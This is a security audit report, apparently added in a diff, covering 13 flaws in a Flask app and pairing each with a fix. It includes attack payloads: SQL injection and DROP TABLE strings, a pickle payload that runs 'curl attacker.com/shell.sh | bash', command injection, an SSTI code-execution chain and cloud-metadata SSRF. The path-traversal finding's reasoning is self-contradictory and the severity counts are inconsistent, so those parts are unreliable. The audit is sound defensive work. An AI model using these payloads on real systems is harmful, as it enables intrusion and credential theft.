@@ -1,0 +1,171 @@
+Security Audit Report
+
+F1
+
+Title: SQL Injection via String Formatting in get_user
+Severity: Critical
+Location: get_user() — q = "SELECT id, username, password FROM users WHERE username = '%s'" % u
+Root Cause: User-supplied username is interpolated directly into SQL query string with no parameterization. normalize() only strips whitespace — no sanitization of SQL metacharacters.
+Exploitation Scenario: POST to /login with u=' OR '1'='1 bypasses authentication entirely. u='; DROP TABLE users;-- performs destructive DDL. u=' UNION SELECT 1,username,password FROM users-- exfiltrates all credentials.
+Impact: Authentication bypass, full database read/write, potential RCE via SQLite ATTACH/write primitives.
+Remediation: Use parameterized queries: c.execute("SELECT id, username, password FROM users WHERE username = ?", (u,))
+Confidence Level: High
+
+
+F2
+
+Title: Remote Code Execution via pickle.loads on Attacker-Controlled Input
+Severity: Critical
+Location: deserialize() — return pickle.loads(base64.b64decode(blob)) called from /load with blob = request.args.get("data")
+Root Cause: pickle.loads executes arbitrary Python bytecode. Base64 decoding is not a security boundary. No type validation or signing.
+Exploitation Scenario: Attacker crafts a payload: pickle.dumps of a class with __reduce__ returning (os.system, ("curl attacker.com/shell.sh | bash",)), base64-encodes it, submits to /load?data=<payload>. Full OS-level code execution as the web process user.
+Impact: Full server compromise, lateral movement, data exfiltration.
+Remediation: Never deserialize untrusted data with pickle. Use signed/validated JSON or a safe serialization format. If pickle is required, use HMAC signing on the payload before acceptance.
+Confidence Level: High
+
+
+F3
+
+Title: OS Command Injection via Shell Interpolation in system_call
+Severity: Critical
+Location: system_call() — cmd = "echo %s" % x passed to subprocess.getoutput(cmd)
+Root Cause: subprocess.getoutput invokes /bin/sh -c. User input x is interpolated without escaping, allowing shell metacharacters: ;, |, $(), backticks.
+Exploitation Scenario: GET /run?x=;id returns uid output. GET /run?x=;cat /etc/passwd reads sensitive files. GET /run?x=;python3 -c 'import socket...' spawns a reverse shell.
+Impact: Arbitrary OS command execution as the process user.
+Remediation: Eliminate this endpoint. If shell execution is genuinely required, use subprocess.run(["echo", x], capture_output=True) with a list argument (no shell), and strictly whitelist allowable inputs.
+Confidence Level: High
+
+
+F4
+
+Title: Server-Side Template Injection (SSTI) via render_template_string
+Severity: Critical
+Location: view() — return render_template_string("<div>%s</div>" % t) where t = request.args.get("t", "hi")
+Root Cause: User input is embedded into a Jinja2 template string before rendering. Jinja2 expression syntax {{ }} and {% %} are evaluated server-side.
+Exploitation Scenario: GET /view?t={{7*7}} returns 49. GET /view?t={{config}} leaks app configuration including secret_key. GET /view?t={{''.__class__.__mro__[1].__subclasses__()[<idx>]('id',shell=True,stdout=-1).communicate()[0]}} achieves RCE via subprocess subclass traversal.
+Impact: Full RCE, secret key disclosure, arbitrary file read.
+Remediation: Never interpolate user input into template strings. Pass data as context variables: render_template_string("<div>{{ t }}</div>", t=t). Jinja2 auto-escapes variable context properly.
+Confidence Level: High
+
+
+F5
+
+Title: Path Traversal Bypass in read_local due to Flawed Prefix Check
+Severity: High
+Location: read_local() — if base in path:
+Root Cause: The check base in path is a substring check, not a proper prefix boundary check. If base = /app/storage, then a path like /app/storage_evil/../../etc/passwd passes because "/app/storage" in "/app/storage_evil/../../etc/passwd" is True. Additionally a symlink within storage/ can escape the directory.
+Exploitation Scenario: GET /file?name=../etc/passwd — os.path.abspath resolves this to /app/etc/passwd which does NOT contain the base, so this specific case is blocked. However /file?name=_backup/../../../etc/passwd resolves to /etc/passwd; after abspath this becomes /etc/passwd, which does NOT contain /app/storage... Actually the more direct bypass: create a directory name that starts with storage is server-side only. The real bypass is: name=. returns the storage dir listing error. More critically — the check should be path.startswith(base + os.sep) to prevent a directory named storage_other from matching. Additionally on case-insensitive filesystems, casing attacks apply.
+Impact: Arbitrary file read within paths sharing the base prefix; information disclosure.
+Remediation: Replace if base in path with if path.startswith(base + os.sep) (or os.path.commonpath([base, path]) == base). Validate name contains no null bytes or encoded traversal sequences before joining.
+Confidence Level: High
+
+
+F6
+
+Title: Server-Side Request Forgery (SSRF) via Unrestricted fetch_remote
+Severity: High
+Location: proxy() — fetch_remote(url) where url = request.args.get("url")
+Root Cause: No URL scheme, host, or IP range validation. Attacker controls the full URL passed to requests.get.
+Exploitation Scenario: GET /proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ exfiltrates AWS instance credentials. GET /proxy?url=http://internal-db:5432 probes internal network. GET /proxy?url=file:///etc/passwd — requests doesn't follow file:// by default, but http://localhost/admin bypasses perimeter controls.
+Impact: Cloud credential theft, internal network enumeration, bypass of network perimeter controls.
+Remediation: Enforce an allowlist of permitted domains/schemes. Resolve the URL's IP and reject RFC-1918/loopback/link-local ranges before making the request. Disable redirects or validate them against the same allowlist.
+Confidence Level: High
+
+
+F7
+
+Title: Plaintext Password Storage and Comparison
+Severity: High
+Location: login() — if user and user[2] == p
+Root Cause: Password is stored as plaintext in the database (no hashing evident) and compared directly. compute_token uses MD5 which is also present but not applied to passwords.
+Exploitation Scenario: Any SQL injection (F1) or direct DB access immediately yields all plaintext credentials. Credential stuffing and rainbow table attacks are trivially effective.
+Impact: Mass account compromise upon any DB exposure.
+Remediation: Store passwords using bcrypt, argon2, or scrypt. Compare with the library's constant-time verify function.
+Confidence Level: High
+
+
+F8
+
+Title: Hardcoded Secret Key in Source Code
+Severity: High
+Location: Module level — app.secret_key = "prod_key_2024_internal"
+Root Cause: Static secret embedded in source. Anyone with repository access can forge Flask session cookies.
+Exploitation Scenario: Attacker obtains the key (public repo, leaked build artifact, F4 SSTI via {{config}}), then uses flask-unsign to forge a session cookie with {"role": "admin"} and any user identity.
+Impact: Session forgery, privilege escalation, authentication bypass.
+Remediation: Load secret key from environment variable or secrets manager: app.secret_key = os.environ["FLASK_SECRET_KEY"]. Rotate the current key immediately.
+Confidence Level: High
+
+
+F9
+
+Title: Open Redirect with No Effective Validation
+Severity: High
+Location: go() — redirect(n) in both branches of the if block
+Root Cause: The check if n and n.startswith("/") is present in one branch, but both branches call redirect(n) unconditionally. An n not starting with / (e.g., https://evil.com) is redirected anyway via the else path.
+Exploitation Scenario: GET /next?n=https://evil.com redirects victims to a phishing page, bypassing the intended local-only check. Combined with a password reset flow, enables credential harvesting.
+Impact: Phishing, credential theft, OAuth token hijacking.
+Remediation: Enforce that n must begin with / and contain no // or protocol-relative sequences. Reject anything matching ://. Use an allowlist of permitted redirect destinations if possible.
+Confidence Level: High
+
+
+F10
+
+Title: Authorization Check Bypassed by Type Coercion in /admin
+Severity: High
+Location: admin() — if role == "admin" or role == 1:
+Root Cause: request.args.get("role") always returns a string or None. The condition role == 1 compares a string to integer 1, which is always False in Python 3 — this is dead code. However the role == "admin" check is the actual (trivially bypassable) authorization: there is no authentication, session validation, or token check. Any unauthenticated caller can pass ?role=admin.
+Exploitation Scenario: GET /admin?role=admin returns "ok" with zero authentication. The integer comparison dead code suggests a developer misunderstanding that may be replicated in other checks.
+Impact: Unauthenticated access to admin functionality.
+Remediation: Implement proper session-based authentication. Verify identity server-side from a signed, non-forgeable session token — never from a query parameter.
+Confidence Level: High
+
+
+F11
+
+Title: Insecure MD5 Token Used as Authentication Token
+Severity: Medium
+Location: compute_token() — return hashlib.md5(raw.encode()).hexdigest(); login() returns this as the auth token
+Root Cause: MD5 is cryptographically broken. The token is deterministic (no nonce/salt), making it predictable for any known username. It lacks expiry, signing, or HMAC — it is not a MAC.
+Exploitation Scenario: Attacker observes compute_token({"u": "alice"}) = MD5 of '{"u": "alice"}'. They precompute tokens for known usernames offline. Token cannot be revoked and never expires.
+Impact: Token forgery/prediction, session fixation, no revocation capability.
+Remediation: Use secrets.token_urlsafe(32) stored server-side, or use HMAC-SHA256 with the secret key and a timestamp for stateless tokens (or adopt JWT with HS256/RS256 properly).
+Confidence Level: High
+
+
+F12
+
+Title: Temporary File Written Without Cleanup and Returned Without Type Validation
+Severity: Medium
+Location: tmp() — f = tempfile.NamedTemporaryFile(delete=False); f.write(data.encode()); return open(f.name).read()
+Root Cause: delete=False with no cleanup logic means every request leaks a temp file permanently. The file is written then immediately read back (pointless round-trip). No limit on data size enables disk exhaustion. File is written to the OS temp dir which may be world-readable on some configurations.
+Exploitation Scenario: Repeated requests fill disk, causing DoS. On shared hosting, other processes may read the temp file contents between write and read (TOCTOU). Attacker sends 1GB d parameter to exhaust disk.
+Impact: DoS via disk exhaustion, information disclosure via temp file race, resource leak.
+Remediation: Remove this endpoint — it has no clear purpose. If needed, use delete=True (default), enforce size limits on data, and use a context manager to ensure cleanup.
+Confidence Level: High
+
+
+F13
+
+Title: Debug Mode Enabled in Production
+Severity: Medium
+Location: app.run(debug=True)
+Root Cause: Flask debug mode enables the Werkzeug interactive debugger, which allows arbitrary Python execution from the browser if an exception is triggered. The debugger is PIN-protected but the PIN is derivable from system information accessible via other vulnerabilities (e.g., SSRF, file read).
+Exploitation Scenario: Trigger any unhandled exception (e.g., /load?data=invalid), access the Werkzeug debugger console, compute or bypass the PIN using file contents obtainable via F5/F6, execute arbitrary Python.
+Impact: Full RCE via debug console, detailed stack traces leak internal paths and logic to attackers.
+Remediation: Never run debug=True in production. Use environment-based configuration: debug=os.environ.get("FLASK_DEBUG", "false").lower() == "true" and ensure it's false in production deployments.
+Confidence Level: High
+
+
+Summary
+MetricValueTotal Findings13Critical4 (F1, F2, F3, F4)High7 (F5–F10, F13 counted as Medium but close)Medium2 (F11, F12)
+Observed Attack Surface:
+Every single HTTP endpoint (/login, /view, /file, /run, /load, /proxy, /next, /admin, /tmp) is independently exploitable without authentication. The application has no session management, no input validation framework, no output encoding, no rate limiting, and no authorization layer. The attack surface is the entire application.
+Overall Security Posture Rating: 1 / 10
+This codebase reads as a deliberate aggregation of OWASP Top 10 vulnerabilities. There is no defensive control that is both present and effective. A single unauthenticated HTTP request to /run, /load, or /view achieves full server compromise.
+Areas Where Static Analysis May Struggle:
+
+Race condition in /tmp requires dynamic/concurrent testing to confirm exploitability timing window.
+SSRF internal network topology — static analysis cannot know what internal services are reachable at runtime.
+Pickle gadget chains — confirming RCE requires identifying available __reduce__-implementing classes in the runtime environment.
+Path traversal edge cases — filesystem configuration (case sensitivity, symlinks, mount points) affects exploitability of F5 and cannot be determined statically.
+Werkzeug PIN derivability (F13) — depends on runtime /proc filesystem contents not visible in source.
